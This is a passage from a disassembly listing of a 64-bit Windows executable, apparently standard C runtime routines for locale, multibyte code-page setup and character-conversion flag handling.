   140007feb:	48 8b cb             	mov    %rbx,%rcx
   140007fee:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140007ff4:	e8 53 ec ff ff       	call   0x140006c4c
   140007ff9:	8b c7                	mov    %edi,%eax
   140007ffb:	e9 c7 00 00 00       	jmp    0x1400080c7
   140008000:	45 84 f6             	test   %r14b,%r14b
   140008003:	75 05                	jne    0x14000800a
   140008005:	e8 f6 d6 ff ff       	call   0x140005700
   14000800a:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   140008011:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140008018:	8b c7                	mov    %edi,%eax
   14000801a:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   14000801e:	03 c7                	add    %edi,%eax
   140008020:	75 1f                	jne    0x140008041
   140008022:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   140008029:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140008030:	48 8d 05 69 20 01 00 	lea    0x12069(%rip),%rax        # 0x14001a0a0
   140008037:	48 3b c8             	cmp    %rax,%rcx
   14000803a:	74 05                	je     0x140008041
   14000803c:	e8 0b ec ff ff       	call   0x140006c4c
   140008041:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   140008047:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   14000804e:	48 89 98 88 00 00 00 	mov    %rbx,0x88(%rax)
   140008055:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   14000805c:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   140008062:	85 0d 88 27 01 00    	test   %ecx,0x12788(%rip)        # 0x14001a7f0
   140008068:	75 54                	jne    0x1400080be
   14000806a:	48 8d 85 a0 01 00 00 	lea    0x1a0(%rbp),%rax
   140008071:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140008076:	4c 8d 4c 24 24       	lea    0x24(%rsp),%r9
   14000807b:	48 8d 85 a8 01 00 00 	lea    0x1a8(%rbp),%rax
   140008082:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140008087:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   14000808c:	b8 05 00 00 00       	mov    $0x5,%eax
   140008091:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140008096:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000809b:	89 44 24 24          	mov    %eax,0x24(%rsp)
   14000809f:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400080a3:	e8 f8 f8 ff ff       	call   0x1400079a0
   1400080a8:	45 84 f6             	test   %r14b,%r14b
   1400080ab:	74 11                	je     0x1400080be
   1400080ad:	48 8b 85 a8 01 00 00 	mov    0x1a8(%rbp),%rax
   1400080b4:	48 8b 08             	mov    (%rax),%rcx
   1400080b7:	48 89 0d 82 26 01 00 	mov    %rcx,0x12682(%rip)        # 0x14001a740
   1400080be:	33 c9                	xor    %ecx,%ecx
   1400080c0:	e8 87 eb ff ff       	call   0x140006c4c
   1400080c5:	8b c6                	mov    %esi,%eax
   1400080c7:	4c 8d 9c 24 70 02 00 	lea    0x270(%rsp),%r11
   1400080ce:	00 
   1400080cf:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400080d3:	49 8b 73 28          	mov    0x28(%r11),%rsi
   1400080d7:	49 8b e3             	mov    %r11,%rsp
   1400080da:	41 5e                	pop    %r14
   1400080dc:	5f                   	pop    %rdi
   1400080dd:	5d                   	pop    %rbp
   1400080de:	c3                   	ret
   1400080df:	cc                   	int3
   1400080e0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400080e5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400080ea:	57                   	push   %rdi
   1400080eb:	48 83 ec 20          	sub    $0x20,%rsp
   1400080ef:	48 8b f2             	mov    %rdx,%rsi
   1400080f2:	48 8b f9             	mov    %rcx,%rdi
   1400080f5:	8b 05 f5 26 01 00    	mov    0x126f5(%rip),%eax        # 0x14001a7f0
   1400080fb:	85 81 a8 03 00 00    	test   %eax,0x3a8(%rcx)
   140008101:	74 13                	je     0x140008116
   140008103:	48 83 b9 90 00 00 00 	cmpq   $0x0,0x90(%rcx)
   14000810a:	00 
   14000810b:	74 09                	je     0x140008116
   14000810d:	48 8b 99 88 00 00 00 	mov    0x88(%rcx),%rbx
   140008114:	eb 64                	jmp    0x14000817a
   140008116:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000811b:	e8 4c 0b 00 00       	call   0x140008c6c
   140008120:	90                   	nop
   140008121:	48 8b 9f 88 00 00 00 	mov    0x88(%rdi),%rbx
   140008128:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000812d:	48 3b 1e             	cmp    (%rsi),%rbx
   140008130:	74 3e                	je     0x140008170
   140008132:	48 85 db             	test   %rbx,%rbx
   140008135:	74 22                	je     0x140008159
   140008137:	83 c8 ff             	or     $0xffffffff,%eax
   14000813a:	f0 0f c1 03          	lock xadd %eax,(%rbx)
   14000813e:	83 f8 01             	cmp    $0x1,%eax
   140008141:	75 16                	jne    0x140008159
   140008143:	48 8d 05 56 1f 01 00 	lea    0x11f56(%rip),%rax        # 0x14001a0a0
   14000814a:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000814f:	48 3b c8             	cmp    %rax,%rcx
   140008152:	74 05                	je     0x140008159
   140008154:	e8 f3 ea ff ff       	call   0x140006c4c
   140008159:	48 8b 06             	mov    (%rsi),%rax
   14000815c:	48 89 87 88 00 00 00 	mov    %rax,0x88(%rdi)
   140008163:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140008168:	f0 ff 00             	lock incl (%rax)
   14000816b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008170:	b9 05 00 00 00       	mov    $0x5,%ecx
   140008175:	e8 46 0b 00 00       	call   0x140008cc0
   14000817a:	48 85 db             	test   %rbx,%rbx
   14000817d:	74 13                	je     0x140008192
   14000817f:	48 8b c3             	mov    %rbx,%rax
   140008182:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140008187:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000818c:	48 83 c4 20          	add    $0x20,%rsp
   140008190:	5f                   	pop    %rdi
   140008191:	c3                   	ret
   140008192:	e8 79 dc ff ff       	call   0x140005e10
   140008197:	90                   	nop
   140008198:	48 83 ec 28          	sub    $0x28,%rsp
   14000819c:	80 3d 41 32 01 00 00 	cmpb   $0x0,0x13241(%rip)        # 0x14001b3e4
   1400081a3:	75 4c                	jne    0x1400081f1
   1400081a5:	48 8d 0d 34 22 01 00 	lea    0x12234(%rip),%rcx        # 0x14001a3e0
   1400081ac:	48 89 0d 1d 32 01 00 	mov    %rcx,0x1321d(%rip)        # 0x14001b3d0
   1400081b3:	48 8d 05 e6 1e 01 00 	lea    0x11ee6(%rip),%rax        # 0x14001a0a0
   1400081ba:	48 8d 0d 0f 21 01 00 	lea    0x1210f(%rip),%rcx        # 0x14001a2d0
   1400081c1:	48 89 05 10 32 01 00 	mov    %rax,0x13210(%rip)        # 0x14001b3d8
   1400081c8:	48 89 0d f9 31 01 00 	mov    %rcx,0x131f9(%rip)        # 0x14001b3c8
   1400081cf:	e8 94 e2 ff ff       	call   0x140006468
   1400081d4:	4c 8d 0d fd 31 01 00 	lea    0x131fd(%rip),%r9        # 0x14001b3d8
   1400081db:	4c 8b c0             	mov    %rax,%r8
   1400081de:	b2 01                	mov    $0x1,%dl
   1400081e0:	b9 fd ff ff ff       	mov    $0xfffffffd,%ecx
   1400081e5:	e8 86 fc ff ff       	call   0x140007e70
   1400081ea:	c6 05 f3 31 01 00 01 	movb   $0x1,0x131f3(%rip)        # 0x14001b3e4
   1400081f1:	b0 01                	mov    $0x1,%al
   1400081f3:	48 83 c4 28          	add    $0x28,%rsp
   1400081f7:	c3                   	ret
   1400081f8:	48 83 ec 28          	sub    $0x28,%rsp
   1400081fc:	e8 93 e1 ff ff       	call   0x140006394
   140008201:	48 8d 15 d0 31 01 00 	lea    0x131d0(%rip),%rdx        # 0x14001b3d8
   140008208:	48 8b c8             	mov    %rax,%rcx
   14000820b:	48 83 c4 28          	add    $0x28,%rsp
   14000820f:	e9 cc fe ff ff       	jmp    0x1400080e0
   140008214:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140008219:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000821e:	56                   	push   %rsi
   14000821f:	57                   	push   %rdi
   140008220:	41 54                	push   %r12
   140008222:	41 56                	push   %r14
   140008224:	41 57                	push   %r15
   140008226:	48 83 ec 40          	sub    $0x40,%rsp
   14000822a:	48 8b 05 cf 1d 01 00 	mov    0x11dcf(%rip),%rax        # 0x14001a000
   140008231:	48 33 c4             	xor    %rsp,%rax
   140008234:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140008239:	48 8b f2             	mov    %rdx,%rsi
   14000823c:	e8 2f f9 ff ff       	call   0x140007b70
   140008241:	33 db                	xor    %ebx,%ebx
   140008243:	8b f8                	mov    %eax,%edi
   140008245:	85 c0                	test   %eax,%eax
   140008247:	0f 84 54 02 00 00    	je     0x1400084a1
   14000824d:	4c 8d 25 9c 22 01 00 	lea    0x1229c(%rip),%r12        # 0x14001a4f0
   140008254:	44 8b f3             	mov    %ebx,%r14d
   140008257:	49 8b c4             	mov    %r12,%rax
   14000825a:	8d 6b 01             	lea    0x1(%rbx),%ebp
   14000825d:	39 38                	cmp    %edi,(%rax)
   14000825f:	0f 84 46 01 00 00    	je     0x1400083ab
   140008265:	44 03 f5             	add    %ebp,%r14d
   140008268:	48 83 c0 30          	add    $0x30,%rax
   14000826c:	41 83 fe 05          	cmp    $0x5,%r14d
   140008270:	72 eb                	jb     0x14000825d
   140008272:	81 ff e8 fd 00 00    	cmp    $0xfde8,%edi
   140008278:	0f 84 25 01 00 00    	je     0x1400083a3
   14000827e:	0f b7 cf             	movzwl %di,%ecx
   140008281:	ff 15 31 7f 00 00    	call   *0x7f31(%rip)        # 0x1400101b8
   140008287:	85 c0                	test   %eax,%eax
   140008289:	0f 84 14 01 00 00    	je     0x1400083a3
   14000828f:	b8 e9 fd 00 00       	mov    $0xfde9,%eax
   140008294:	3b f8                	cmp    %eax,%edi
   140008296:	75 26                	jne    0x1400082be
   140008298:	48 89 46 04          	mov    %rax,0x4(%rsi)
   14000829c:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   1400082a3:	89 5e 18             	mov    %ebx,0x18(%rsi)
   1400082a6:	66 89 5e 1c          	mov    %bx,0x1c(%rsi)
   1400082aa:	48 8d 7e 0c          	lea    0xc(%rsi),%rdi
   1400082ae:	0f b7 c3             	movzwl %bx,%eax
   1400082b1:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400082b6:	66 f3 ab             	rep stos %ax,(%rdi)
   1400082b9:	e9 d9 01 00 00       	jmp    0x140008497
   1400082be:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400082c3:	8b cf                	mov    %edi,%ecx
   1400082c5:	ff 15 05 7f 00 00    	call   *0x7f05(%rip)        # 0x1400101d0
   1400082cb:	85 c0                	test   %eax,%eax
   1400082cd:	0f 84 c4 00 00 00    	je     0x140008397
   1400082d3:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   1400082d7:	33 d2                	xor    %edx,%edx
   1400082d9:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   1400082df:	e8 8c 6c 00 00       	call   0x14000ef70
   1400082e4:	83 7c 24 20 02       	cmpl   $0x2,0x20(%rsp)
   1400082e9:	89 7e 04             	mov    %edi,0x4(%rsi)
   1400082ec:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   1400082f3:	0f 85 94 00 00 00    	jne    0x14000838d
   1400082f9:	48 8d 4c 24 26       	lea    0x26(%rsp),%rcx
   1400082fe:	38 5c 24 26          	cmp    %bl,0x26(%rsp)
   140008302:	74 2c                	je     0x140008330
   140008304:	38 59 01             	cmp    %bl,0x1(%rcx)
   140008307:	74 27                	je     0x140008330
   140008309:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   14000830d:	0f b6 11             	movzbl (%rcx),%edx
   140008310:	3b d0                	cmp    %eax,%edx
   140008312:	77 14                	ja     0x140008328
   140008314:	2b c2                	sub    %edx,%eax
   140008316:	8d 7a 01             	lea    0x1(%rdx),%edi
   140008319:	8d 14 28             	lea    (%rax,%rbp,1),%edx
   14000831c:	80 4c 37 18 04       	orb    $0x4,0x18(%rdi,%rsi,1)
   140008321:	03 fd                	add    %ebp,%edi
   140008323:	48 2b d5             	sub    %rbp,%rdx
   140008326:	75 f4                	jne    0x14000831c
   140008328:	48 83 c1 02          	add    $0x2,%rcx
   14000832c:	38 19                	cmp    %bl,(%rcx)
   14000832e:	75 d4                	jne    0x140008304
   140008330:	48 8d 46 1a          	lea    0x1a(%rsi),%rax
   140008334:	b9 fe 00 00 00       	mov    $0xfe,%ecx
   140008339:	80 08 08             	orb    $0x8,(%rax)
   14000833c:	48 03 c5             	add    %rbp,%rax
   14000833f:	48 2b cd             	sub    %rbp,%rcx
   140008342:	75 f5                	jne    0x140008339
   140008344:	8b 4e 04             	mov    0x4(%rsi),%ecx
   140008347:	81 e9 a4 03 00 00    	sub    $0x3a4,%ecx
   14000834d:	74 2e                	je     0x14000837d
   14000834f:	83 e9 04             	sub    $0x4,%ecx
   140008352:	74 20                	je     0x140008374
   140008354:	83 e9 0d             	sub    $0xd,%ecx
   140008357:	74 12                	je     0x14000836b
   140008359:	3b cd                	cmp    %ebp,%ecx
   14000835b:	74 05                	je     0x140008362
   14000835d:	48 8b c3             	mov    %rbx,%rax
   140008360:	eb 22                	jmp    0x140008384
   140008362:	48 8b 05 67 94 00 00 	mov    0x9467(%rip),%rax        # 0x1400117d0
   140008369:	eb 19                	jmp    0x140008384
   14000836b:	48 8b 05 56 94 00 00 	mov    0x9456(%rip),%rax        # 0x1400117c8
   140008372:	eb 10                	jmp    0x140008384
   140008374:	48 8b 05 45 94 00 00 	mov    0x9445(%rip),%rax        # 0x1400117c0
   14000837b:	eb 07                	jmp    0x140008384
   14000837d:	48 8b 05 34 94 00 00 	mov    0x9434(%rip),%rax        # 0x1400117b8
   140008384:	48 89 86 20 02 00 00 	mov    %rax,0x220(%rsi)
   14000838b:	eb 02                	jmp    0x14000838f
   14000838d:	8b eb                	mov    %ebx,%ebp
   14000838f:	89 6e 08             	mov    %ebp,0x8(%rsi)
   140008392:	e9 13 ff ff ff       	jmp    0x1400082aa
   140008397:	39 1d 43 30 01 00    	cmp    %ebx,0x13043(%rip)        # 0x14001b3e0
   14000839d:	0f 85 fe 00 00 00    	jne    0x1400084a1
   1400083a3:	83 c8 ff             	or     $0xffffffff,%eax
   1400083a6:	e9 00 01 00 00       	jmp    0x1400084ab
   1400083ab:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   1400083af:	33 d2                	xor    %edx,%edx
   1400083b1:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   1400083b7:	e8 b4 6b 00 00       	call   0x14000ef70
   1400083bc:	41 8b c6             	mov    %r14d,%eax
   1400083bf:	4d 8d 4c 24 10       	lea    0x10(%r12),%r9
   1400083c4:	4c 8d 1d 15 21 01 00 	lea    0x12115(%rip),%r11        # 0x14001a4e0
   1400083cb:	41 be 04 00 00 00    	mov    $0x4,%r14d
   1400083d1:	4c 8d 3c 40          	lea    (%rax,%rax,2),%r15
   1400083d5:	49 c1 e7 04          	shl    $0x4,%r15
   1400083d9:	4d 03 cf             	add    %r15,%r9
   1400083dc:	49 8b d1             	mov    %r9,%rdx
   1400083df:	41 38 19             	cmp    %bl,(%r9)
   1400083e2:	74 3e                	je     0x140008422
   1400083e4:	38 5a 01             	cmp    %bl,0x1(%rdx)
   1400083e7:	74 39                	je     0x140008422
   1400083e9:	44 0f b6 02          	movzbl (%rdx),%r8d
   1400083ed:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   1400083f1:	44 3b c0             	cmp    %eax,%r8d
   1400083f4:	77 24                	ja     0x14000841a
   1400083f6:	45 8d 50 01          	lea    0x1(%r8),%r10d
   1400083fa:	41 81 fa 01 01 00 00 	cmp    $0x101,%r10d
   140008401:	73 17                	jae    0x14000841a
   140008403:	41 8a 03             	mov    (%r11),%al
   140008406:	44 03 c5             	add    %ebp,%r8d
   140008409:	41 08 44 32 18       	or     %al,0x18(%r10,%rsi,1)
   14000840e:	44 03 d5             	add    %ebp,%r10d
   140008411:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140008415:	44 3b c0             	cmp    %eax,%r8d
   140008418:	76 e0                	jbe    0x1400083fa
   14000841a:	48 83 c2 02          	add    $0x2,%rdx
   14000841e:	38 1a                	cmp    %bl,(%rdx)
   140008420:	75 c2                	jne    0x1400083e4
   140008422:	49 83 c1 08          	add    $0x8,%r9
   140008426:	4c 03 dd             	add    %rbp,%r11
   140008429:	4c 2b f5             	sub    %rbp,%r14
   14000842c:	75 ae                	jne    0x1400083dc
   14000842e:	89 7e 04             	mov    %edi,0x4(%rsi)
   140008431:	89 6e 08             	mov    %ebp,0x8(%rsi)
   140008434:	81 ef a4 03 00 00    	sub    $0x3a4,%edi
   14000843a:	74 29                	je     0x140008465
   14000843c:	83 ef 04             	sub    $0x4,%edi
   14000843f:	74 1b                	je     0x14000845c
   140008441:	83 ef 0d             	sub    $0xd,%edi
   140008444:	74 0d                	je     0x140008453
   140008446:	3b fd                	cmp    %ebp,%edi
   140008448:	75 22                	jne    0x14000846c
   14000844a:	48 8b 1d 7f 93 00 00 	mov    0x937f(%rip),%rbx        # 0x1400117d0
   140008451:	eb 19                	jmp    0x14000846c
   140008453:	48 8b 1d 6e 93 00 00 	mov    0x936e(%rip),%rbx        # 0x1400117c8
   14000845a:	eb 10                	jmp    0x14000846c
   14000845c:	48 8b 1d 5d 93 00 00 	mov    0x935d(%rip),%rbx        # 0x1400117c0
   140008463:	eb 07                	jmp    0x14000846c
   140008465:	48 8b 1d 4c 93 00 00 	mov    0x934c(%rip),%rbx        # 0x1400117b8
   14000846c:	49 8d 7c 24 04       	lea    0x4(%r12),%rdi
   140008471:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   140008478:	49 03 ff             	add    %r15,%rdi
   14000847b:	48 8d 56 0c          	lea    0xc(%rsi),%rdx
   14000847f:	b9 06 00 00 00       	mov    $0x6,%ecx
   140008484:	0f b7 07             	movzwl (%rdi),%eax
   140008487:	48 8d 7f 02          	lea    0x2(%rdi),%rdi
   14000848b:	66 89 02             	mov    %ax,(%rdx)
   14000848e:	48 8d 52 02          	lea    0x2(%rdx),%rdx
   140008492:	48 2b cd             	sub    %rbp,%rcx
   140008495:	75 ed                	jne    0x140008484
   140008497:	48 8b ce             	mov    %rsi,%rcx
   14000849a:	e8 e9 f7 ff ff       	call   0x140007c88
   14000849f:	eb 08                	jmp    0x1400084a9
   1400084a1:	48 8b ce             	mov    %rsi,%rcx
   1400084a4:	e8 47 f7 ff ff       	call   0x140007bf0
   1400084a9:	33 c0                	xor    %eax,%eax
   1400084ab:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400084b0:	48 33 cc             	xor    %rsp,%rcx
   1400084b3:	e8 a8 8e ff ff       	call   0x140001360
   1400084b8:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   1400084bd:	49 8b 5b 40          	mov    0x40(%r11),%rbx
   1400084c1:	49 8b 6b 48          	mov    0x48(%r11),%rbp
   1400084c5:	49 8b e3             	mov    %r11,%rsp
   1400084c8:	41 5f                	pop    %r15
   1400084ca:	41 5e                	pop    %r14
   1400084cc:	41 5c                	pop    %r12
   1400084ce:	5f                   	pop    %rdi
   1400084cf:	5e                   	pop    %rsi
   1400084d0:	c3                   	ret
   1400084d1:	cc                   	int3
   1400084d2:	cc                   	int3
   1400084d3:	cc                   	int3
   1400084d4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400084d9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400084de:	57                   	push   %rdi
   1400084df:	48 83 ec 40          	sub    $0x40,%rsp
   1400084e3:	8b da                	mov    %edx,%ebx
   1400084e5:	41 8b f9             	mov    %r9d,%edi
   1400084e8:	48 8b d1             	mov    %rcx,%rdx
   1400084eb:	41 8b f0             	mov    %r8d,%esi
   1400084ee:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400084f3:	e8 c4 f1 ff ff       	call   0x1400076bc
   1400084f8:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1400084fd:	0f b6 d3             	movzbl %bl,%edx
   140008500:	40 84 7c 02 19       	test   %dil,0x19(%rdx,%rax,1)
   140008505:	75 18                	jne    0x14000851f
   140008507:	85 f6                	test   %esi,%esi
   140008509:	74 10                	je     0x14000851b
   14000850b:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140008510:	48 8b 08             	mov    (%rax),%rcx
   140008513:	0f b7 04 51          	movzwl (%rcx,%rdx,2),%eax
   140008517:	85 c6                	test   %eax,%esi
   140008519:	75 04                	jne    0x14000851f
   14000851b:	33 c0                	xor    %eax,%eax
   14000851d:	eb 05                	jmp    0x140008524
   14000851f:	b8 01 00 00 00       	mov    $0x1,%eax
   140008524:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140008529:	74 0c                	je     0x140008537
   14000852b:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140008530:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   140008537:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000853c:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140008541:	48 83 c4 40          	add    $0x40,%rsp
   140008545:	5f                   	pop    %rdi
   140008546:	c3                   	ret
   140008547:	cc                   	int3
   140008548:	8b d1                	mov    %ecx,%edx
   14000854a:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140008550:	33 c9                	xor    %ecx,%ecx
   140008552:	45 33 c0             	xor    %r8d,%r8d
   140008555:	e9 7a ff ff ff       	jmp    0x1400084d4
   14000855a:	cc                   	int3
   14000855b:	cc                   	int3
   14000855c:	b8 ac de 00 00       	mov    $0xdeac,%eax
   140008561:	3b c8                	cmp    %eax,%ecx
   140008563:	77 4f                	ja     0x1400085b4
   140008565:	74 44                	je     0x1400085ab
   140008567:	b8 33 c4 00 00       	mov    $0xc433,%eax
   14000856c:	3b c8                	cmp    %eax,%ecx
   14000856e:	77 1f                	ja     0x14000858f
   140008570:	74 39                	je     0x1400085ab
   140008572:	8b c1                	mov    %ecx,%eax
   140008574:	83 e8 2a             	sub    $0x2a,%eax
   140008577:	74 32                	je     0x1400085ab
   140008579:	2d 02 c4 00 00       	sub    $0xc402,%eax
   14000857e:	74 2b                	je     0x1400085ab
   140008580:	83 e8 01             	sub    $0x1,%eax
   140008583:	74 26                	je     0x1400085ab
   140008585:	83 e8 01             	sub    $0x1,%eax
   140008588:	74 21                	je     0x1400085ab
   14000858a:	83 f8 03             	cmp    $0x3,%eax
   14000858d:	eb 1a                	jmp    0x1400085a9
   14000858f:	8b c1                	mov    %ecx,%eax
   140008591:	2d 35 c4 00 00       	sub    $0xc435,%eax
   140008596:	74 13                	je     0x1400085ab
   140008598:	2d 63 12 00 00       	sub    $0x1263,%eax
   14000859d:	74 48                	je     0x1400085e7
   14000859f:	2d 12 08 00 00       	sub    $0x812,%eax
   1400085a4:	74 05                	je     0x1400085ab
   1400085a6:	83 f8 01             	cmp    $0x1,%eax
   1400085a9:	75 02                	jne    0x1400085ad
   1400085ab:	33 d2                	xor    %edx,%edx
   1400085ad:	48 ff 25 24 7c 00 00 	rex.W jmp *0x7c24(%rip)        # 0x1400101d8
   1400085b4:	8b c1                	mov    %ecx,%eax
   1400085b6:	2d ad de 00 00       	sub    $0xdead,%eax
   1400085bb:	74 ee                	je     0x1400085ab
   1400085bd:	83 e8 01             	sub    $0x1,%eax
   1400085c0:	74 e9                	je     0x1400085ab
   1400085c2:	83 e8 01             	sub    $0x1,%eax
   1400085c5:	74 e4                	je     0x1400085ab
   1400085c7:	83 e8 01             	sub    $0x1,%eax
   1400085ca:	74 df                	je     0x1400085ab
   1400085cc:	83 e8 01             	sub    $0x1,%eax
   1400085cf:	74 da                	je     0x1400085ab
   1400085d1:	83 e8 01             	sub    $0x1,%eax
   1400085d4:	74 d5                	je     0x1400085ab
   1400085d6:	83 e8 01             	sub    $0x1,%eax
   1400085d9:	74 d0                	je     0x1400085ab
   1400085db:	2d 35 1f 00 00       	sub    $0x1f35,%eax
   1400085e0:	74 c9                	je     0x1400085ab
   1400085e2:	83 f8 01             	cmp    $0x1,%eax
   1400085e5:	75 c6                	jne    0x1400085ad
   1400085e7:	83 e2 08             	and    $0x8,%edx
   1400085ea:	eb c1                	jmp    0x1400085ad
   1400085ec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400085f1:	57                   	push   %rdi
   1400085f2:	8d 81 18 02 ff ff    	lea    -0xfde8(%rcx),%eax
   1400085f8:	45 8b d9             	mov    %r9d,%r11d
   1400085fb:	83 f8 01             	cmp    $0x1,%eax
   1400085fe:	49 8b d8             	mov    %r8,%rbx
   140008601:	b8 ac de 00 00       	mov    $0xdeac,%eax
   140008606:	41 0f 96 c2          	setbe  %r10b
   14000860a:	33 ff                	xor    %edi,%edi
   14000860c:	3b c8                	cmp    %eax,%ecx
   14000860e:	77 41                	ja     0x140008651
   140008610:	74 78                	je     0x14000868a
   140008612:	b8 33 c4 00 00       	mov    $0xc433,%eax
   140008617:	3b c8                	cmp    %eax,%ecx
   140008619:	77 1f                	ja     0x14000863a
   14000861b:	74 6d                	je     0x14000868a
   14000861d:	8b c1                	mov    %ecx,%eax
   14000861f:	83 e8 2a             	sub    $0x2a,%eax
   140008622:	74 66                	je     0x14000868a
   140008624:	2d 02 c4 00 00       	sub    $0xc402,%eax
   140008629:	74 5f                	je     0x14000868a
   14000862b:	83 e8 01             	sub    $0x1,%eax
   14000862e:	74 5a                	je     0x14000868a
   140008630:	83 e8 01             	sub    $0x1,%eax
   140008633:	74 55                	je     0x14000868a
   140008635:	83 f8 03             	cmp    $0x3,%eax
   140008638:	eb 48                	jmp    0x140008682
   14000863a:	8b c1                	mov    %ecx,%eax
   14000863c:	2d 35 c4 00 00       	sub    $0xc435,%eax
   140008641:	74 47                	je     0x14000868a
   140008643:	2d 63 12 00 00       	sub    $0x1263,%eax
   140008648:	74 40                	je     0x14000868a
   14000864a:	2d 12 08 00 00       	sub    $0x812,%eax
   14000864f:	eb 2c                	jmp    0x14000867d
   140008651:	8b c1                	mov    %ecx,%eax
   140008653:	2d ad de 00 00       	sub    $0xdead,%eax
   140008658:	74 30                	je     0x14000868a
   14000865a:	83 e8 01             	sub    $0x1,%eax
   14000865d:	74 2b                	je     0x14000868a
   14000865f:	83 e8 01             	sub    $0x1,%eax
   140008662:	74 26                	je     0x14000868a
   140008664:	83 e8 01             	sub    $0x1,%eax
   140008667:	74 21                	je     0x14000868a
   140008669:	83 e8 01             	sub    $0x1,%eax
   14000866c:	74 1c                	je     0x14000868a
   14000866e:	83 e8 01             	sub    $0x1,%eax
   140008671:	74 17                	je     0x14000868a
   140008673:	83 e8 01             	sub    $0x1,%eax
   140008676:	74 12                	je     0x14000868a
   140008678:	2d 35 1f 00 00       	sub    $0x1f35,%eax
   14000867d:	74 0b                	je     0x14000868a
   14000867f:	83 f8 01             	cmp    $0x1,%eax
   140008682:	74 06                	je     0x14000868a
   140008684:	0f ba f2 07          	btr    $0x7,%edx
   140008688:	eb 02                	jmp    0x14000868c
   14000868a:	8b d7                	mov    %edi,%edx
   14000868c:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140008691:	45 84 d2             	test   %r10b,%r10b
   140008694:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   140008699:	4c 8b c0             	mov    %rax,%r8
   14000869c:	4c 0f 45 c7          	cmovne %rdi,%r8
   1400086a0:	4c 0f 45 cf          	cmovne %rdi,%r9
   1400086a4:	74 07                	je     0x1400086ad
   1400086a6:	48 85 c0             	test   %rax,%rax
   1400086a9:	74 02                	je     0x1400086ad
   1400086ab:	89 38                	mov    %edi,(%rax)
   1400086ad:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   1400086b2:	4c 8b c3             	mov    %rbx,%r8
   1400086b5:	4c 89 4c 24 40       	mov    %r9,0x40(%rsp)
   1400086ba:	45 8b cb             	mov    %r11d,%r9d
   1400086bd:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   1400086c2:	5f                   	pop    %rdi
   1400086c3:	48 ff 25 16 7b 00 00 	rex.W jmp *0x7b16(%rip)        # 0x1400101e0
   1400086ca:	cc                   	int3
   1400086cb:	cc                   	int3
   1400086cc:	48 8b c4             	mov    %rsp,%rax
   1400086cf:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400086d3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400086d7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400086db:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400086df:	41 56                	push   %r14
   1400086e1:	48 83 ec 40          	sub    $0x40,%rsp
   1400086e5:	ff 15 fd 7a 00 00    	call   *0x7afd(%rip)        # 0x1400101e8
   1400086eb:	33 f6                	xor    %esi,%esi
   1400086ed:	48 8b d8             	mov    %rax,%rbx
   1400086f0:	48 85 c0             	test   %rax,%rax
   1400086f3:	75 07                	jne    0x1400086fc
   1400086f5:	33 c0                	xor    %eax,%eax
   1400086f7:	e9 c3 00 00 00       	jmp    0x1400087bf
   1400086fc:	48 8b eb             	mov    %rbx,%rbp
